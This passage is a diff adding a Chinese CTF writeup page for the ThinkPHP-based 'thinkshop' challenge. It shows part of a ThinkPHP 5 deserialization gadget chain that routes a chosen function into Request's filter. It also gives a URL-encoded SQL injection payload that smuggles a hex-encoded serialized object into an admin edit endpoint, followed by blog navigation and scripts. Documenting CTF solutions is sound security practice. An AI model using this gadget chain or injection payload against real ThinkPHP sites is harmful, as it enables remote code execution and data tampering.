+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Relation</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$config</span>  <span class="token operator">=</span> <span class="token punctuation">[</span>
+            <span class="token string single-quoted-string">'expire'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+            <span class="token string single-quoted-string">'session_name'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
+        <span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'jelly/'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">{</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">{</span>
+        <span class="token keyword">protected</span> <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"jelly"</span><span class="token operator">=&gt;</span><span class="token variable">$parameter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></span></code></pre>
+
+<p><img src="image-3.png" alt="image-3.png"></p>
+<p>反序列化 触发点在 goods.<span class="hexo-wm">ꜱ﻿³𝘷𝐞𝒏·‌‌𝐬𝐢‌ｔe﻿‍</span>html 里：</p>
+<p><img src="image-4.png" alt="image-4.png"></p>
+<h2 id="3-sql-injection"><a href="#3-sql-injection" class="headerlink" title="3. sql injection"></a>3. sql injection</h2><p><img src="image-5.png" alt="image-5.png"></p>
+<p>在 $key 处 <span class="hexo-wm">𝘴‍​3ⅴℯ𝐧∙‍‍𝘴𝐢​𝐭ｅ‌</span>进行 injection，poc：</p>
+<pre class="language-none"><code class="language-none">data%60%3dunhex(%2759546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364d7a7037637a6f354f6949414b6742686348426c626d51694f3245364d547037637a6f314f694a715a57787365534937637a6f344f694a6e5a585246636e4a766369493766584d364f446f6941436f415a584a79623349694f3038364d7a4136496e526f61573572584731765a47567358484a6c624746306157397558454a6c624739755a334e55627949364d7a7037637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364d6a4136496d4e68644341765a6d5a6d5a6d7873624746685957466e5a32646e496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f3331396658317a4f6a45784f6949414b6742696157356b515852306369493759546f784f6e74704f6a4137637a6f774f6949694f333139637a6f324f694a7759584a6c626e51694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364d6a4136496d4e68644341765a6d5a6d5a6d7873624746685957466e5a32646e496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f333139665831396658303d%27)%2f**%2fwhere%2f**%2fid%3d1%23%26id%3d1%26data%3d1%0a</code></pre>
+<p>使用 Brup Suite 拦截 POST <span class="hexo-wm">s‌​𝟯𝘷𝘦𝒏․﻿𝘴ｉ‌ｔ𝘦‌</span>/public/index.php/index/admin/do_edit.html 修改数据<br>再次访问修改完成的商品获得 flag：</p>
+<p><img src="image-6.png" alt="image-6.png"></p>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+                <a href="../../skill/%E9%80%9A%E8%BF%87-css-injection-%E5%AE%9E%E7%8E%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" target="_self">
+                  <i class="iconfont icon-chevronleft"></i>
+                  <span>上一页</span>
+                </a>
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2023-nctf-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hello-spring"><span class="toc-text">hello spring</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-text">1. 解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Poc"><span class="toc-text">2. Poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#happygame"><span class="toc-text">happygame</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%BF%9E%E6%8E%A5-gRPC"><span class="toc-text">1. 连接 gRPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-java-cc6-unserialize-poc"><span class="toc-text">2. java cc6 unserialize poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#thinkshop"><span class="toc-text">thinkshop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-login"><span class="toc-text">1. login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-unserialize-poc-thinkphp-5"><span class="toc-text">2. unserialize poc (thinkphp 5)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sql-injection"><span class="toc-text">3. sql injection</span></a></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
